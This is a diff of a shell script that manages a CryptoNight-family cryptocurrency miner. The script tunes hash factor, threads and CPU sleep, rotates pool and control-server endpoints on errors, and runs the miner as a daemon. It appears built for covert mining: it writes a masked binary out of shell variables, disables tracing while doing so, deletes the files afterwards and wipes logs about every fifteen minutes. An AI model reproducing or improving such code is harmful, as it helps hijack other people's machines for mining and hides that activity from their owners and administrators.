@@ -93,13 +93,13 @@ parse_al() {
 
 ## increase or decrease mhf depending on previous and new pow
 tune_mhf() {
-    local base factor mhf mhf_fix
+    local factor= mhf= mhf_fix=
     case "$job_algo" in
         "cn-heavy")
             [ -n "$MHF_HV" ] && mhf_fix=$MHF_HV
             ;;
         "cn")
-            [ -n "$MHF_FIXED" ] && mhf_fix=$MHF_FIXED
+            [ -n "$MHF_FIXED_ORIG" ] && mhf_fix=$MHF_FIXED_ORIG
             ;;
         "cn-lite")
             [ -n "$MHF_LT" ] && mhf_fix=$MHF_LT
@@ -108,6 +108,7 @@ tune_mhf() {
             [ -n "$MHF_PC" ] && mhf_fix=$MHF_PC
             ;;
     esac
+    [ -n "$mhf_fix" ] && MHF_FIXED=${mhf_fix}
     case "$AL" in
         "cn-heavy")
             case "$job_algo" in
@@ -141,12 +142,16 @@ tune_mhf() {
                 cn-pico) return ;;
             esac
             ;;
+        *)
+            mhf=1
+            ;;
     esac
     if [ "$mhf" -gt 5 ]; then
         mhf=5
     elif [ "$mhf" -lt 1 ]; then
         mhf=1
     fi
+    log "tune_mhf - mhf_fix: ${mhf_fix}, mhf: ${mhf}"
     cMhf=${mhf_fix:-${mhf}}
     ## use change config to override MHF_FIXED
     change_config hash-factor "$cMhf"
@@ -154,29 +159,28 @@ tune_mhf() {
 
 tune_sleep(){
     ## don't tune sleep if disabled
-    [ -z "$CSLEEP" -o $CSLEEP = 0 -o $CLSEEP = -1 ] && return
-    local csleep base=${CSLEEP}
+    [ -z "$CSLEEP" -o $CSLEEP = "0" -o $CLSEEP = "-1" ] && return
+    local base=${CSLEEP}
     case "$job_algo" in
         "cn-heavy")
-            csleep=${CSLEEP_HV:-$((base*2))}
+            CSLEEP=${CSLEEP_HV:-$((base*2))}
             ;;
         "cn")
             ## sleep less for lower iterations variants
-            if [ "${job_variant/half}" != "${job_variant}" ] ||
-                   [ "${job_variant/fast}" != "${job_variant}" ]; then
-                csleep=${CSLEEP_HL:-$((base/2))}
+            if [ "$job_variant" = half -o "$job_variant" = fast ]; then
+                CSLEEP=${CSLEEP_HL:-$((base/2))}
             else
-                csleep=$base
+                CSLEEP=$CSLEEP_ORIG
             fi
             ;;
         "cn-lite")
-            csleep=${CSLEEP_LT:-$((base/2))}
+            CSLEEP=${CSLEEP_LT:-$((base/2))}
             ;;
         "cn-pico")
-            csleep=${CSLEEP_PC:-$((base/6))}
+            CSLEEP=${CSLEEP_PC:-$((base/6))}
             ;;
     esac
-    change_config cpu-sleep $csleep
+    change_config cpu-sleep $CSLEEP
 }
 
 ## change_profile takes care of tunables for the hashrate switcher algo
@@ -265,12 +269,12 @@ load_bins() {
             fileToVar "${OBJ_MASK}" OBJ_BIN || obj_fail=1
             # fileToVar "${CLM_MASK}" CLM_BIN || clm_fail=1
         }
-        log "loadbins: checking fail"
+        log "loadbins: checking if failed"
         if [ "$obj_fail" = 1 -o "$clm_fail" = 1 ]; then
             log "loadbins: fail... retrying..."
             continue
         else
-            log "loadbins: success clearing bins"
+            log "loadbins: success loading bins"
             [ "$1" = rm ] && rm -f "${OBJ_MASK}" "${CLM_MASK}"
             break
         fi
@@ -284,10 +288,10 @@ dump_bins() {
         log "missing obj bin variable, trying to reload..."
         load_bins || { log "load bins failed again"; return 1; }
     fi
-    # disable_tracing
+    disable_tracing
     varToFile OBJ_BIN "${OBJ_MASK}" ; chmod +x "${OBJ_MASK}" && unset OBJ_BIN
     # varToFile CLM_BIN "${CLM_MASK}" ; chmod +x "${CLM_MASK}" && unset CLM_BIN
-    # enable_tracing
+    enable_tracing
 }
 
 ## choose the initial config state
@@ -349,7 +353,9 @@ init() {
     export MHs=999999 XHs=0 CHs=0 NHs=0 PHs=0 THs=0 AHs=0 ## initial HS/s values
     export pMhf=0 pThr=0 pMsk=0x0 ## previous values hashfactor,hashmask,threads
     export xMhf=1 xThr=1 xMsk=0x0 ## hashfactor,hashmask,threads at the latest recorded max hashrate
-    export cMhf=$(get_config hash-factor) cThr=$(get_config threads) cMsk=$(get_config thread-mask)
+    export cMhf=$(get_config hash-factor) cThr=$(get_config threads) cMsk=$(get_config thread-mask) ; cMhf=${cMhf:-1}
+    export MHF_FIXED_ORIG=${MHF_FIXED} ## used by tune_mhf
+    export CSLEEP_ORIG=${CSLEEP} ## used by tune_sleep
 
     ## SWITCH_STATE : state of the state machine
     init_state
@@ -413,7 +419,7 @@ rmcfg() {
 
 ## the command of the daemon to start (pausd)
 start_miner() {
-    clear_log
+    [ -n "$VERBOSE_KEEP"] || clear_log
     log "miner: starting miner..."
     while :; do
         lock_miner && break
@@ -520,11 +526,15 @@ change_mhf() {
         up)
             if [ $cMhf -lt 5 ]; then
                 nMhf=$((cMhf+1))
+            else
+                return 1
             fi
             ;;
         down)
             if [ $cMhf -gt 1 ]; then
                 nMhf=$((cMhf-1))
+            else
+                return 1
             fi
             ;;
         *)
@@ -539,7 +549,7 @@ change_mhf() {
             ;;
     esac
     pMhf=$cMhf
-    cMhf=$nMhf
+    cMhf=${nMhf:-${pMhf}}
     change_config hash-factor $cMhf
 }
 
@@ -573,7 +583,7 @@ change_threads() {
             ;;
     esac
     pThr=$cThr
-    cThr=$nThr
+    cThr=${nThr:-${pThr}}
     change_config threads $cThr
 }
 
@@ -918,6 +928,8 @@ change_state(){
                             SWITCH_STATE=PLUS_THREAD_MINUS_MHF ||
                                 SWITCH_STATE=MHF_DOWN_THEN_SLEEP
                                 start_sleeping
+                    else
+                        start_sleeping
                     fi
                     ;;
                 "B_MHF_TRIAL") ## try increasing mhf again, in this state there could be already multiple threads but full mask
@@ -1254,13 +1266,24 @@ choose_action() {
                 scratcher
             fi
             ;;
-        "[CC-Client] error"|"Error: \"[Connect]"|"POOL #1:      (null)")
+        "[CC-Client] error")
+            error_count=$((error_count+1))
+            if [ "$error_count" -gt 3 ]; then
+                ## choose different endpoints
+                stop_miner
+                config_client
+                config_config 1 ## 1 parameter sets CONFIG evaluating the template
+                remove_config
+                start_miner
+                error_count=0
+            fi
+            ;;
+        "Error: \"[Connect]"|"POOL #1:      (null)")
             error_count=$((error_count+1))
             if [ "$error_count" -gt 3 ]; then
                 ## choose different endpoints
                 stop_miner
                 config_pools
-                config_client
                 config_config 1 ## 1 parameter sets CONFIG evaluating the template
                 remove_config
                 start_miner
@@ -1300,7 +1323,7 @@ choose_action() {
             # [ -n "$RMCFG_SCHEDULE" -a -z "$update_lock" ] && rmcfg ##  set by start miner
             [ "$((SECONDS%1000))" -gt 900  ] &&
                 [ -a "$((SECONDS-CLEARED_LOGS))" -gt 100 -o -z "$CLEARED_LOGS" ] &&
-                { clear_log; ## wipe log every ~15mins
+                { [ -z "$VERBOSE_KEEP" ] && clear_log; ## wipe log every ~15mins
                   CLEARED_LOGS=$SECONDS; }
             ;;
     esac
